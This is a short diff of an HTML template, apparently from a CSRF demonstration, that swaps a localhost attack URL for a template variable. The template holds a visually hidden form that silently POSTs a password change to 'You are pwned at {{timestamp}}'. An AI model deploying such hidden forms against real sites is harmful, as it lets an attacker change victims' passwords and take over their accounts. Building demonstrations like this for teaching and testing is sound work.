@@ -25,7 +25,7 @@
         </code>
       </div> 
     </div>
-    <form class="visually-hidden" action="http://127.0.0.1/csrf-attack/" method="POST" id="update-form" onsubmit="">
+    <form class="visually-hidden" action="{{csrf_endpoint}}" method="POST" id="update-form" onsubmit="">
       <input class="visually-hidden" name="action" value="modify">
       <input class="visually-hidden" name="password" value="You are pwned at {{timestamp}}">
     </form>
